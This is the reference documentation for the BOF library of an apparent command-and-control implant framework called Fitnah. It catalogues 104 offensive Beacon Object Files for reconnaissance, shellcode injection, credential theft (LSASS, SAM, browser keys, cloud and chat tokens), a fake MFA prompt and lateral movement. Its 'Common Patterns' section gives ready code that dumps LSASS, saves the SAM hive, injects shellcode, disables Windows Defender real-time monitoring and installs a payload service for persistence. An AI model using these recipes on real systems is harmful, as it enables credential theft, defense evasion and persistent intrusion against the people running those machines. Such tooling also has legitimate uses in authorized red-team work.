# BOF Library Reference

Fitnah includes 104 pre-compiled Beacon Object Files from TrustedSec's open-source collections, organized in `fitnah/bofs/`. BOFs execute in-process on the implant — no child process, no PowerShell, no disk write.

---

## What Is a BOF

A Beacon Object File is a position-independent COFF `.o` file. The implant's `BofExecute()` function loads it directly into the current process's memory, calls its entry point, then discards the allocation. From an EDR perspective, no new process spawns, no script interpreter runs, and nothing touches disk.

Wire protocol when a BOF command is dispatched:

```json
{"type":"TASK","id":"a1b2c3d4","command":"bof","args":{"coff_b64":"<base64>","args_b64":"<base64>"}}
```

The implant decodes both fields, executes the COFF, and returns output in the ACK.

---

## Dispatching BOFs from a Plugin

```python
# Named BOF from the library — simplest form
r = ctx.bof("whoami")

# Named BOF with packed arguments
args = ctx.bof_pack("z", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
r = ctx.bof("reg_query", args_b64=args)

# Arbitrary COFF (not in library)
coff_bytes = Path("custom.x64.o").read_bytes()
r = ctx.bof_raw(coff_bytes)
```

Return value is always `{"status": "ok"|"error"|"timeout", "output": str}`.

---

## Argument Packing

`ctx.bof_pack(fmt, *values)` uses the Cobalt Strike BOF argument format:

| Char | Type | Wire encoding |
|---|---|---|
| `z` | null-terminated ASCII string | uint32 length + bytes + `\x00` |
| `Z` | null-terminated UTF-16LE string | uint32 length + UTF-16LE bytes + `\x00\x00` |
| `i` | signed int32 | 4 bytes little-endian |
| `s` | signed int16 | 2 bytes little-endian |
| `b` | raw bytes | uint32 length prefix + bytes |
| `o` | raw bytes (same as `b`) | uint32 length prefix + bytes |

```python
# One ASCII string
args = ctx.bof_pack("z", "domain.local")

# PID (int32) + shellcode bytes
args = ctx.bof_pack("ib", 1234, shellcode_bytes)

# Two strings + int
args = ctx.bof_pack("zzi", key_path, value_name, 1)
```

---

## Full BOF Catalogue

### Recon / Situational Awareness (50 BOFs)

| Name | Description | Args |
|---|---|---|
| `whoami` | Current user, groups, privileges | none |
| `ipconfig` | All network interfaces | none |
| `arp` | ARP cache | none |
| `netstat` | TCP/UDP connections | none |
| `netview` | Network shares visible to this host | none |
| `netshares` | Shares on a remote server | `z` hostname |
| `netuser` | List domain/local users | `z` domain (optional) |
| `netgroup` | Domain groups | none |
| `netlocalgroup` | Local groups | none |
| `netloggedon` | Users logged on remotely | `z` hostname |
| `netuptime` | System uptime | none |
| `netuse` | Mapped drives | none |
| `nslookup` | DNS lookup | `z` hostname |
| `listdns` | DNS cache | none |
| `routeprint` | Routing table | none |
| `uptime` | System uptime (local) | none |
| `locale` | System locale | none |
| `env` | Environment variables | none |
| `resources` | CPU/memory stats | none |
| `tasklist` | Running processes | none |
| `listmods` | Loaded modules in a process | `i` PID |
| `findLoadedModule` | Find module across all processes | `z` module_name |
| `windowlist` | Visible windows | none |
| `enumLocalSessions` | Active logon sessions | none |
| `get_session_info` | Session details | none |
| `driversigs` | Check driver signing status | none |
| `list_firewall_rules` | Windows Firewall rules | none |
| `wmi_query` | WMI query | `zz` namespace, query |
| `ldapsearch` | LDAP search (authenticated) | `zzzi` domain, user, pass, scope |
| `nonpagedldapsearch` | LDAP search via non-paged control | `zz` domain, filter |
| `ldapsecuritycheck` | Check LDAP signing/binding | `z` domain |
| `adv_audit_policies` | Audit policy settings | none |
| `aadjoininfo` | AAD join information | none |
| `sc_enum` | Enumerate services | `z` hostname |
| `sc_query` | Query a service | `zz` hostname, service_name |
| `sc_qc` | Service config | `zz` hostname, service_name |
| `sc_qdescription` | Service description | `zz` hostname, service_name |
| `sc_qtriggerinfo` | Service trigger info | `zz` hostname, service_name |
| `schtasksenum` | Enumerate scheduled tasks | `z` hostname |
| `schtasksquery` | Query a scheduled task | `zz` hostname, task_name |
| `vssenum` | Enumerate VSS shadow copies | `z` hostname |
| `dir` | Directory listing | `z` path |
| `get_priv` | Current token privileges | none |
| `cacls` | File ACLs | `z` path |
| `md5` | MD5 hash a file | `z` path |
| `sha1` | SHA1 hash a file | `z` path |
| `sha256` | SHA256 hash a file | `z` path |
| `conhost` | ConHost process info | none |
| `uxsubclassinfo` | UxSubclass info (desktop enum) | none |

### Execution / Injection (11 BOFs)

| Name | Description | Args |
|---|---|---|
| `createremotethread` | Inject shellcode via CreateRemoteThread | `ib` pid, shellcode |
| `ntcreatethread` | Inject shellcode via NtCreateThread | `ib` pid, shellcode |
| `ntqueueapcthread` | Inject shellcode via NtQueueApcThread | `ib` pid, shellcode |
| `setthreadcontext` | Inject shellcode via SetThreadContext | `ib` pid, shellcode |
| `kernelcallbacktable` | KernelCallbackTable hijack | `ib` pid, shellcode |
| `clipboardinject` | Inject via clipboard (SetClipboardViewer) | `ib` pid, shellcode |
| `shspawnas` | Spawn process as another user | `zzzz` user, domain, pass, cmd |
| `make_token_cert` | Create token from cert | `z` cert_path |
| `tooltip` | Inject via tooltip (UpdateWindow) | `ib` pid, shellcode |
| `dde` | DDE execution | `z` command |
| `ctray` | CTray COM execution | `z` command |

### Credential Access (15 BOFs)

| Name | Description | Args |
|---|---|---|
| `procdump` | MiniDump a process (lsass default) | `iz` pid, output_path |
| `reg_save` | Save registry hive to file | `zz` key, output_path |
| `get_dpapi_system` | Dump DPAPI system masterkey | none |
| `get_password_policy` | Domain password policy | none |
| `chromeKey` | Decrypt Chrome AES key | none |
| `lastpass` | LastPass vault decryption | none |
| `slackKey` | Slack token extraction | none |
| `slack_cookie` | Slack cookies | none |
| `office_tokens` | Office 365 tokens | none |
| `get_azure_token` | Azure AD tokens | none |
| `ask_mfa` | Prompt for MFA (social engineering) | `z` reason |
| `adcs_enum` | AD Certificate Services enumeration | `z` domain |
| `adcs_enum_com` | ADCS via COM interface | none |
| `adcs_enum_com2` | ADCS via COM interface (alt) | none |
| `adcs_request` | Request ADCS certificate | `zz` template, alt_name |

### Defense Evasion (4 BOFs)

| Name | Description | Args |
|---|---|---|
| `global_unprotect` | Remove PAGE_GUARD from memory regions | none |
| `suspendresume` | Suspend/resume a process | `ii` pid, 0_suspend_1_resume |
| `ProcessDestroy` | Terminate a process | `i` pid |
| `ProcessListHandles` | List handles in a process | `i` pid |

### Lateral Movement (24 BOFs)

| Name | Description | Args |
|---|---|---|
| `reg_query` | Query registry key/value | `zz` key, value_name |
| `reg_set` | Set registry value (DWORD) | `zzi` key, value_name, data |
| `reg_delete` | Delete registry value | `zz` key, value_name |
| `sc_create` | Create a service | `zzz` hostname, name, bin_path |
| `sc_start` | Start a service | `zz` hostname, name |
| `sc_stop` | Stop a service | `zz` hostname, name |
| `sc_delete` | Delete a service | `zz` hostname, name |
| `sc_config` | Reconfigure a service | `zzzz` hostname, name, type, start |
| `sc_description` | Set service description | `zzz` hostname, name, desc |
| `sc_failure` | Set service failure actions | `zz` hostname, name |
| `schtaskscreate` | Create scheduled task | `zzzzz` hostname, name, cmd, trigger, user |
| `schtasksrun` | Run a scheduled task | `zz` hostname, name |
| `schtasksstop` | Stop a scheduled task | `zz` hostname, name |
| `schtasksdelete` | Delete a scheduled task | `zz` hostname, name |
| `adduser` | Add a local user | `zz` username, password |
| `addusertogroup` | Add user to group | `zz` username, group |
| `disableuser` | Disable a local user | `z` username |
| `enableuser` | Enable a local user | `z` username |
| `unexpireuser` | Un-expire a user account | `z` username |
| `setuserpass` | Set a user's password | `zz` username, new_password |
| `shutdown` | Shutdown/reboot | `i` 0_shutdown_1_reboot |
| `ghost_task` | Ghost scheduled task (no security descriptor) | `zzz` hostname, name, cmd |
| `adcs_request_on_behalf` | ADCS cert on behalf of another user | `zzz` template, target_user, alt_name |
| `nettime` | Query domain time server | `z` domain |

---

## Common Patterns

### Dump LSASS

```python
import tempfile
out = tempfile.mktemp(suffix=".dmp")
args = ctx.bof_pack("iz", 0, out)  # pid=0 means find lsass automatically
r = ctx.bof("procdump", args_b64=args)
```

### Save SAM hive

```python
args = ctx.bof_pack("zz", "HKLM\\SAM", r"C:\Windows\Temp\sam.hiv")
r = ctx.bof("reg_save", args_b64=args)
```

### Inject shellcode into a process

```python
args = ctx.bof_pack("ib", pid, shellcode_bytes)
r = ctx.bof("createremotethread", args_b64=args)
```

### Enumerate domain users

```python
args = ctx.bof_pack("z", "corp.local")
r = ctx.bof("netuser", args_b64=args)
```

### Set a registry value

```python
# Set DWORD value
args = ctx.bof_pack("zzi",
    r"HKLM\SOFTWARE\Microsoft\Windows Defender",
    "DisableRealtimeMonitoring",
    1
)
r = ctx.bof("reg_set", args_b64=args)
```

### Create a service for persistence

```python
args = ctx.bof_pack("zzz",
    "TARGET-HOST",
    "SvcName",
    r"C:\Windows\Temp\payload.exe"
)
r = ctx.bof("sc_create", args_b64=args)
if r["status"] == "ok":
    args2 = ctx.bof_pack("zz", "TARGET-HOST", "SvcName")
    ctx.bof("sc_start", args_b64=args2)
```

---

## Adding New BOFs

To add a new BOF (must be a COFF `.o` file):

1. Compile your BOF or obtain a pre-compiled `.x64.o` file
2. Copy it to the appropriate category in `fitnah/bofs/`:
   ```
   fitnah/bofs/recon/mybof.x64.o
   ```
3. Add an entry to `fitnah/bofs/manifest.json`:
   ```json
   {
     "mybof": {
       "category": "recon",
       "path": "fitnah/bofs/recon/mybof.x64.o",
       "arch": "x64"
     }
   }
   ```
4. That's it. Call it with `ctx.bof("mybof")` from any plugin.

### BOF source compatibility

Any BOF written for Cobalt Strike will work without modification as long as it:
- Uses the `BeaconPrintf` / `BeaconOutput` Beacon API for output (linked against `beacon.h`)
- Parses arguments from the buffer passed via `bof_pack`
- Does not use `BeaconSpawnTemporaryProcess` (unsupported in Fitnah)

---

## Source Libraries

Both collections are MIT-licensed:

- [TrustedSec/CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) — 50 recon BOFs
- [TrustedSec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF) — 54 execution/credential/lateral BOFs
